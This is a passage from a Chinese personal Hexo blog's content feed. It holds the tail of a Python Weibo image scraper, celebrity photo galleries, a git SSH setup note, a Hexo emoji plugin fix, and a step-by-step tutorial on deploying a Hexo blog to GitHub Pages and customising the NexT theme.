class="string">&#x27;photo_list&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> t:</span><br><span class="line">            name =x[<span class="string">&#x27;pic_name&#x27;</span>]</span><br><span class="line">            src=<span class="string">&#x27;https://wx2.sinaimg.cn/mw690/&#x27;</span>+name <span class="comment">#不一样的名字</span></span><br><span class="line">            <span class="comment">#下载函数</span></span><br><span class="line">            download(name,src,z)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">name,src,z</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        path =<span class="string">r&#x27;G:/Desktop/blog/&#x27;</span><span class="comment">#保存路径</span></span><br><span class="line">        urlretrieve(src,path+name)</span><br><span class="line">        print(<span class="string">&#x27;——————下载第&#x27;</span>+<span class="built_in">str</span>(z)+<span class="string">&#x27;页————————&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&#x27;_______&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sk()</span><br><span class="line">​```</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面是我在bilibili发的教学视频</p><iframe src="//player.bilibili.com/player.html?aid=884230193&bvid=BV1LK4y1Y76Z&cid=224576017&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=800 height=500> </iframe>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IU——Ins日常搬运</title>
      <link href="2020/02/09/IU%E5%9B%BE%E9%9B%86ins%E6%90%AC%E8%BF%90/"/>
      <url>2020/02/09/IU%E5%9B%BE%E9%9B%86ins%E6%90%AC%E8%BF%90/</url>
      
        <content type="html"><![CDATA[<div class="justified-gallery"><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1612833424098.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1612833391956.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1612833461761.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1612833433699.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1612833400075.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1612833312953.jpg" alt=""></p>          </div>]]></content>
      
      
      <categories>
          
          <category> 图集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图集</title>
      <link href="2020/02/05/test/"/>
      <url>2020/02/05/test/</url>
      
        <content type="html"><![CDATA[<div class="justified-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg" alt=""></p>          </div>]]></content>
      
      
      <categories>
          
          <category> 图集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>娜扎——Ins搬运</title>
      <link href="2020/02/04/%E5%A8%9C%E6%89%8E%E2%80%94%E2%80%94Ins%E6%90%AC%E8%BF%90/"/>
      <url>2020/02/04/%E5%A8%9C%E6%89%8E%E2%80%94%E2%80%94Ins%E6%90%AC%E8%BF%90/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1613007107998.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1613007117982.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1613007059635.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1613007050239.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1613006940432.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1613006931829.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1613007028953.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1613007078272.jpg" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/1613006959635.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 图集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 娜扎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git配置ssh</title>
      <link href="2019/11/03/git%E9%85%8D%E7%BD%AEssh/"/>
      <url>2019/11/03/git%E9%85%8D%E7%BD%AEssh/</url>
      
        <content type="html"><![CDATA[<p>首先检查是否有ssh</p><p>打开gitbash</p><p><code>cd ~/.ssh</code></p><p>如果没有</p><p><code>ssh-keygen -t rsa -C &quot;your_email@youremail.com&quot; </code> <a id="more"></a></p><p>在C盘user/用户名目录下会生成.ssh文件</p><p>.pub文件里是ssh公钥，内容复制到github</p><p>测试添加信息</p><p><code>ssh -T git@github.com</code></p><p>新增_hosts主机配置文件</p><p>配置全局git信息</p><p><code>git config --global user.name &quot;your name&quot;</code></p><p><code>git config --global user.emial &quot;your emial&quot;</code></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《关于hexo不支持emoji这档子事》</title>
      <link href="2019/01/23/%E3%80%8A%E5%85%B3%E4%BA%8Ehexo%E4%B8%8D%E6%94%AF%E6%8C%81emoji%E8%BF%99%E6%A1%A3%E5%AD%90%E4%BA%8B%E3%80%8B/"/>
      <url>2019/01/23/%E3%80%8A%E5%85%B3%E4%BA%8Ehexo%E4%B8%8D%E6%94%AF%E6%8C%81emoji%E8%BF%99%E6%A1%A3%E5%AD%90%E4%BA%8B%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>hexo本身不支持emoji，但有时候喜欢用表情，看着好玩儿，</p><p>:cupid:  ​laughing: :+1:hexo不支持github的某些渲染，emm自己借鉴了一位老哥的办法，先安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-markdown-it --save</span><br><span class="line">npm install markdown-it-emoji --save</span><br></pre></td></tr></table></figure><p>修改根目录下的 <code>_config.yml</code>, 先查找一下 <code>markdown</code>，有的话直接修改，没有的话，直接在文件最后添加即可。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">markdown:</span></span><br><span class="line">  <span class="attr">render:</span></span><br><span class="line">    <span class="attr">html:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">xhtmlOut:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">breaks:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">linkify:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">typographer:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">quotes:</span> <span class="string">&#x27;“”‘’&#x27;</span></span><br><span class="line">  <span class="attr">plugins:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-footnote</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sup</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-abbr</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-emoji</span></span><br><span class="line">  <span class="attr">anchors:</span></span><br><span class="line">    <span class="attr">level:</span> <span class="number">2</span></span><br><span class="line">    <span class="attr">collisionSuffix:</span> <span class="string">&#x27;v&#x27;</span></span><br><span class="line">    <span class="attr">permalink:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">permalinkClass:</span> <span class="string">header-anchor</span></span><br><span class="line">    <span class="attr">permalinkSymbol:</span> <span class="string">¶</span></span><br></pre></td></tr></table></figure><h2 id="注意">注意</h2><p>render:<code>下的</code>html<code> 配置项，它的作用时控制 markdown 是否转义文章中的 html 标签，最好改为：</code>true<code>，改为：</code>false<code>的话，会导致</code><a id="more"></a>` 无法被渲染。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用于blog的快速站点搭建</title>
      <link href="2019/01/08/%E5%BF%AB%E9%80%9F%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA/"/>
      <url>2019/01/08/%E5%BF%AB%E9%80%9F%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="前言和准备">前言和准备</h2><p>每个计算机专业学生在学习过程中，都会有一些心得想要记录，但这个专业平时除了基础课更多是和代码在打交道，采用纸质手写笔记是效率非常低的（况且手写代码真的丑），所以技术博客非常有必要。（好像每个计算机专业学生都会折腾这玩意）</p><p>那么问题来了，为啥要自己搭建呢，呃这里面不乏动手喜欢折腾，比较酷的元素QWQ，其实csdn，简书，知乎等地方未尝不可，但界面广告多和文章不过审太搞人心态了，。。所以那就自己动手搭建一个。</p><hr><p>采用Github+hexo框架或者Gitee+hexo框架 区别GitHub服务器在国外响应速度不如Gitee快，但GitHub使用个性化域名是免费的，而Gitee在开启Gitee page服务后需要花钱升级到Gitee Pro才能使用自己的域名。</p><p>github仓库提供300M的存储量对于静态页面部署来说完全够用，首先你需要本地创建一个文件夹存放资源文件</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209231328.png" alt=""></p><p>然后需要一个github账号和仓库创建</p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/github .png" style="zoom:33%;" /><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/461.png" alt=""></p><p>这里仓库名字格式是<code>你的github名字.github.io</code>我这里创建过了，所以它会提示同名重复</p><h2 id="环境搭建">环境搭建</h2><p>因为我是在Windows上部署的，所以不写如何在Linux上搭建。</p><ol><li><p>Node.js</p><p><a href="https://nodejs.org/en/">Node.js官网</a></p><p>选择稳定版本</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/AZEHO%60REGJXR%5B%7DYV2%60%7DOMPR.png" alt=""></p><p>检查是否成功，终端下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/P3QGUQ6OFMOH(C%5BK96%7BO)M4.png" alt=""></p><p><strong>设置npm在安装全局模块时的路径和环境变量</strong></p><p>因为如果不设置的话，安装模块的时候就会把模块装到C盘，占用C盘的空间，并且有可能安装好hexo后却无法使用，所以需要设置一下：</p><p>在 nodejs 文件夹中新建两个空文件夹 node_cache、node_global</p></li></ol><p>​然后cmd输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set prefix &quot;D:\nodejs\node_global&quot;</span><br><span class="line">npm config set cache &quot;D:\nodejs\node_cache&quot;</span><br></pre></td></tr></table></figure><p>​<strong>配置环境变量</strong></p><p>​需要在设置——&gt;编辑系统环境变量里，path一栏新建 ，地址是node.js安装的目录</p><p>​<img src="https://gitee.com/hawk9am/blogimage/raw/master/img/37B@7JSCSGN@OK%7B9TRX%5DR2G.png" alt=""></p><p>​<img src="https://gitee.com/hawk9am/blogimage/raw/master/img/J_V_JUKSZYS%60%7BP@0FD%60%5B$A5.png" alt=""></p><p>​配置npm在安装全局模块时的路径和缓存cache的路径</p><p>​ 在node.js安装目录下新建 <code>node_global</code> ,<code>node_cache</code>两个文件夹，然后在cmd命令下执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm config set prefix &quot;D:\Program Files\nodejs\node_global&quot;</span><br><span class="line"></span><br><span class="line">npm config set cache &quot;D:\Program Files\nodejs\node_cache&quot;</span><br><span class="line">&#x2F;&#x2F;注意这里的地址一定要换成自己的</span><br></pre></td></tr></table></figure><p>然后在环境变量 -&gt; 系统变量中新建一个变量名为<code> NODE_PATH</code>， 值为<code>D:\node.js\node_global\node_modules</code></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/2C1MHWQF@WCJT_1RO69U8UE.png" alt=""></p><p>​ 在cmd命令下执行<code>npm install webpack -g</code>然后安装成功后可以看到自定义的两个文件夹已生效</p><ol start="2"><li><p>hexo</p><p>安装hexo框架</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>如果想检查是否安装成功可以去node的目录下查看</p><p>然后在文件夹下打开 Git Bush终端 初始化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>会在当前目录下初始化文件</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209231851.png" alt=""></p><p>静态部署</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209232101.png" alt=""></p><p>开启端口，在浏览器输入如下地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209232212.png" alt=""></p><p>看见这说明hexo框架应用成功了</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209232326.png" alt=""></p><h2 id="站点配置">站点配置</h2><p>其实到这已经搭建完毕了剩下只需配置（也是最喜欢折腾的环节）</p><p>打开根目录下<code>_config.yml</code>文件，这里不建议用记事本打开，建议用vscode打开项目，便于管理和改写</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209232746.png" alt=""></p><p>ctrl+f 搜索关键字 <code>deploy:</code>然后做如下修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">     type: git</span><br><span class="line">     repository: https:&#x2F;&#x2F;github.com&#x2F;usr&#x2F;usr.github.io.git  #你的仓库地址</span><br><span class="line">     branch: master</span><br></pre></td></tr></table></figure><p>然后在Git Bush终端下载Git部署工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>依次执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean   #清除缓存文件 db.json 和已生成的静态文件 public</span><br><span class="line">   hexo g       #生成网站静态文件到默认设置的 public 文件夹(hexo generate 的缩写)</span><br><span class="line">   hexo d       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)</span><br></pre></td></tr></table></figure><p>然后打开浏览器   <a href="https://link.zhihu.com/?target=https%3A//fengye97.github.io/">https://xxx.github.io</a> 就是网站地址</p><p>如果想用自己的个性化域名，在代码仓库页右边settings选项，找到这里输入域名即可，会强制https访问</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209233304.png" alt=""></p><p>关于主题选择 hexo官方有很多种，都是开源的项目，如果你熟悉HTML,CSS前端的特效之类可以自己造轮子写一个，我审美不太行，所以一开始方向就不是前端，不会写什么特效，但基础的HTML和CSS知识是有的，这对后面魔改主题有帮助，</p><p>这里有hexo框架的官方文档  <a href="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209233923.png">hexo</a></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209233923.png" alt=""></p><p>主题选择  <a href="https://hexo.io/themes/">主题</a></p><p>这里我推荐新手使用next主题，简洁抗折腾</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209234900.png" alt=""></p><p>这是next的Githubc仓库地址  <a href="https://github.com/iissnan/hexo-theme-next">next</a>   git clone 下来放到 站点目录的theme文件夹中 修改文件夹名字为<code>next</code></p><p>然后 修改<code>_config.yml</code>文件中<code>theme: next</code></p><p>关于使用说明文档和魔改</p><p>详见next仓库里的README</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209234918.png" alt=""></p><p>关于写作需要markdown语法的基础知识</p><p>添加文章的标签 <code>hexo new page tag</code> ，在<code>source</code> ,文件夹里会多出个有tag文件夹，打开<code>index.md</code></p><p>添加一行 type：tag</p><p>添加分类 <code>coategories</code> 同上</p><p>头部你可以这么些写</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210209235731.png" alt=""></p><p>到这基本就结束了。关于美化我实在是写不动了，下面这些是从某个老哥那扒来的</p><h2 id="基础美化">基础美化</h2><p>目录</p><ol><li>设置菜单</li></ol></li><li><p>设置建站时间<br>3. 设置头像<br>4. 网站图标设置<br>5. 设置动态背景<br>6. 设置背景图片<br>7. 主页文章添加阴影效果<br>8. 添加顶部加载条<br>9. 设置预览摘要<br>10. 设置侧边栏显示效果<br>11. 侧边栏推荐阅读<br>12. 添加社交链接<br>13. 设置博文内链接为蓝色<br>14. 显示文章字数和阅读时长<br>15. 显示站点文章总字数（另一种统计站点总字数的方法）<br>16. 设置文章末尾”本文结束”标记<br>17. 文章末尾添加版权说明<br>18. 添加访问量统计<br>19. 添加评论功能<br>20. 添加Fork me on Github<br>21. 安装Markdown编译器<br>22. 安装RSS插件<br>23. 项目主页添加README<br>24. 忽略要编译的文件<br>25. 代码块样式自定义<br>26. 支持mathjax公式<br>27. 图床网站<br>28. 本地搜索<br>29. Hexo博客提交百度和Google收录<br>30. 博文置顶<br>31. 添加打赏<br>32. 添加分享（未完成）<br>33. 图片可点击放大查看，放大后可关闭（fancybox可能有点问题，暂时未实现）</p><h2 id="1-设置菜单">1. 设置菜单</h2><p>打开主题配置文件即themes/next下的_config.yml，查找menu，将前面的#删除就行了：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">     home: / || home                      #首页</span><br><span class="line">     archives: /archives/ || archive      #归档</span><br><span class="line">     categories: /categories/ || th       #分类</span><br><span class="line">     tags: /tags/ || tags                 #标签</span><br><span class="line">     about: /about/ || user               #关于</span><br><span class="line">     resources: /resources/ || download   #资源</span><br><span class="line">     #schedule: /schedule/ || calendar    #日历</span><br><span class="line">     #sitemap: /sitemap.xml || sitemap    #站点地图，供搜索引擎爬取</span><br><span class="line">     #commonweal: /404/ || heartbeat      #腾讯公益404</span><br></pre></td></tr></table></figure><p>“||”前面的是目标链接，后面的是图标名称，next使用的图标全是<a href="https://link.zhihu.com/?target=http%3A//www.fontawesome.com.cn/faicons/%23web-application">图标库 - Font Awesome 中文网</a>这一网站的，有想用的图标直接在fontawesome上面找图标的名称就行。resources是我自己添加的。</p><p>新添加的菜单需要翻译对应的中文，打开theme/next/languages/zh-CN.yml，在menu下设置：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">     home: 首页</span><br><span class="line">     archives: 归档</span><br><span class="line">     categories: 分类</span><br><span class="line">     tags: 标签</span><br><span class="line">     about: 关于</span><br><span class="line">     resources: 资源</span><br><span class="line">     search: 搜索</span><br></pre></td></tr></table></figure><p>在根目录下打开Git Bash，输入如下代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;categories&quot;</span><br><span class="line">   hexo new page &quot;tags&quot;</span><br><span class="line">   hexo new page &quot;about&quot;</span><br><span class="line">   hexo new page &quot;resources&quot;</span><br></pre></td></tr></table></figure><p>此时在根目录的sources文件夹下会生成categories、tags、about、resources四个文件，每个文件中有一个<code>index.md</code>文件，修改内容分别如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">   title: 分类</span><br><span class="line">   date: 2020-02-10 22:07:08</span><br><span class="line">   type: &quot;categories&quot;</span><br><span class="line">   comments: false</span><br><span class="line">   ---</span><br><span class="line">   </span><br><span class="line">   ---</span><br><span class="line">   title: 标签</span><br><span class="line">   date: 2020-02-10 22:07:08</span><br><span class="line">   type: &quot;tags&quot;</span><br><span class="line">   comments: false</span><br><span class="line">   ---</span><br><span class="line">   </span><br><span class="line">   ---</span><br><span class="line">   title: 关于</span><br><span class="line">   date: 2020-02-10 22:07:08</span><br><span class="line">   type: &quot;about&quot;</span><br><span class="line">   comments: false</span><br><span class="line">   ---</span><br><span class="line">   </span><br><span class="line">   ---</span><br><span class="line">   title: 资源</span><br><span class="line">   date: 2020-02-10 22:07:08</span><br><span class="line">   type: &quot;resources&quot;</span><br><span class="line">   comments: false</span><br><span class="line">   ---</span><br></pre></td></tr></table></figure><p>注：如果有启用评论，默认页面带有评论。需要关闭的话，添加字段comments并将值设置为false。</p><h2 id="2-设置建站时间">2. 设置建站时间</h2><p>打开主题配置文件即themes/next下的_config.yml，查找since：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">footer:</span><br><span class="line">     # Specify the date when the site was setup. If not defined, current year will be used.</span><br><span class="line">     since: 2020-02   #建站时间</span><br></pre></td></tr></table></figure><h2 id="3-设置头像">3. 设置头像</h2><p>打开主题配置文件即themes/next下的_config.yml，查找avatar，url后是图片的链接地址：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Sidebar Avatar</span><br><span class="line">   avatar:</span><br><span class="line">     # Replace the default image and set the url here.</span><br><span class="line">     url: /images/avatar.gif   #图片的位置，也可以是http://xxx.com/avatar.png</span><br><span class="line">     # If true, the avatar will be dispalyed in circle.</span><br><span class="line">     rounded: true   #头像展示在圈里</span><br><span class="line">     # If true, the avatar will be rotated with the cursor.</span><br><span class="line">     rotated: false  #头像随光标旋转</span><br></pre></td></tr></table></figure><p>然后将你要的头像图片复制到themes/next/source/images里，重命名为avatar.png。</p><h2 id="4-网站图标设置">4. 网站图标设置</h2><p>我是在这个网站找的图标，免费的图标素材网站：<a href="https://link.zhihu.com/?target=https%3A//www.easyicon.net/1220579-maple_leaf_icon.html">Easyicon</a></p><p>下载16x16和32x32的图标后，打开主题配置文件，查找favicon，只要修改small和medium为你的图标路径：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">favicon:</span><br><span class="line">     small: /images/favicon-16x16.png</span><br><span class="line">     medium: /images/favicon-32x32.png</span><br><span class="line">     apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">     safari_pinned_tab: /images/logo.svg</span><br><span class="line">     #android_manifest: /images/manifest.json</span><br><span class="line">     #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure><h2 id="5-设置动态背景">5. 设置动态背景</h2><h3 id="5-1-canvas-nest-风格">5.1 canvas nest 风格</h3><p>效果图：</p><p><img src="https://pic3.zhimg.com/80/v2-0948505c3e3161c767466b90c2649aa2_720w.jpg" alt="img"></p><p>在themes/next目录下打开Git Bash，输入：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest</span><br></pre></td></tr></table></figure><p>打开主题配置文件即themes/next下的_config.yml，找到canvas-nest，将enable：false改为true：（<strong>如果找不到canvas-nest，可能是文件修改了，试试将下面的代码复制粘贴到themes/next中</strong>）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Canvas-nest</span><br><span class="line">   # Dependencies: https://github.com/theme-next/theme-next-canvas-nest</span><br><span class="line">   # For more information: https://github.com/hustcc/canvas-nest.js</span><br><span class="line">   canvas_nest:</span><br><span class="line">     enable: true</span><br><span class="line">     onmobile: true # Display on mobile or not</span><br><span class="line">     color: &quot;0,0,255&quot; # RGB values, use `,` to separate</span><br><span class="line">     opacity: 0.5 # The opacity of line: 0~1</span><br><span class="line">     zIndex: -1 # z-index property of the background</span><br><span class="line">     count: 99 # The number of lines</span><br></pre></td></tr></table></figure><h3 id="5-2-JavaScript-3D-library风格">5.2 JavaScript 3D library风格</h3><p>在themes/next目录下打开Git Bash，输入：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-three source/lib/three</span><br></pre></td></tr></table></figure><p>打开主题配置文件即themes/next下的_config.yml，找到three，这里有三种风格，可以试一下看看喜欢哪种风格，直接将false改为true就行了，我已经选了canvas-nest，就没有选这种风格：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># JavaScript 3D library.</span><br><span class="line">   # Dependencies: https://github.com/theme-next/theme-next-three</span><br><span class="line">   three:</span><br><span class="line">     enable: true</span><br><span class="line">     three_waves: false</span><br><span class="line">     canvas_lines: false</span><br><span class="line">     canvas_sphere: false</span><br></pre></td></tr></table></figure><h2 id="6-设置背景图片">6. 设置背景图片</h2><p>打开主题配置文件即themes/next下的_config.yml，将 style: source/_data/styles.styl 取消注释：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">custom_file_path:</span><br><span class="line">     style: source/_data/styles.styl</span><br></pre></td></tr></table></figure><p>打开根目录Blog/source创建文件_data/styles.styl，添加以下内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 添加背景图片</span><br><span class="line">   body &#123;</span><br><span class="line">         background: url(images/background.png);//自己喜欢的图片地址</span><br><span class="line">         background-size: cover;</span><br><span class="line">         background-repeat: no-repeat;</span><br><span class="line">         background-attachment: fixed;</span><br><span class="line">         background-position: 50% 50%;</span><br><span class="line">   